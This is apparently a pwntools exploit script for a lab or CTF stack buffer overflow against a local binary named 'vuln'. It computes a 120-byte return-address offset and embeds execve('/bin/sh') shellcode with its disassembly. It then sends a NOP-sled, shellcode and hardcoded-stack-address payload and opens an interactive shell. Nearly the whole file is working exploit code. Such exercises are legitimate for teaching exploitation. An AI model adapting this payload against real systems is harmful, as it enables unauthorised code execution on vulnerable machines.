from pwn import * # Import pwntools
import sys

context.update(arch='amd64', os='linux')
elf = ELF("./vuln")# Extract data from binary

p = process("./vuln") # start the vuln binary
#gdb.attach(p)

#useful to take the time to attach manually from gdb (docker)
sys.stdin.read(1) # reads one byte at a time, similar to getchar()

"""
OFFSET
./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
./pattern.py 0x3964413864413764
Pattern 0x3964413864413764 first occurrence at position 112 in pattern.
"""
offset = 112 + 8

"""
SHELLCODE
   0x7fffffffdbfa:	xor    rdx,rdx
   0x7fffffffdbfd:	movabs rbx,0x68732f6e69622f2f
   0x7fffffffdc07:	shr    rbx,0x8
   0x7fffffffdc0b:	push   rbx
   0x7fffffffdc0c:	mov    rdi,rsp
   0x7fffffffdc0f:	push   rax
   0x7fffffffdc10:	push   rdi
   0x7fffffffdc11:	mov    rsi,rsp
   0x7fffffffdc14:	mov    al,0x3b
   0x7fffffffdc16:	syscall 
"""
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

#Strategy
#| NOP SLEED | SHELLCODE | FILLER | RET ADDR |

#Nop sleed for reliability
nop_sleed = b"\x90"*26

#Pointer to nop sleed
#ptr_shellcode = 0x7fffffffe520
#ptr_shellcode_gdb = 0x7fffffffdba0
ptr_shellcode_docker = 0x7fffffffe570

payload = nop_sleed
payload += shellcode
payload += b"C"*(offset-len(nop_sleed)-len(shellcode))
payload += p64(ptr_shellcode_docker)

#Send our payload
p.sendlineafter("BOF.", payload)

p.interactive()
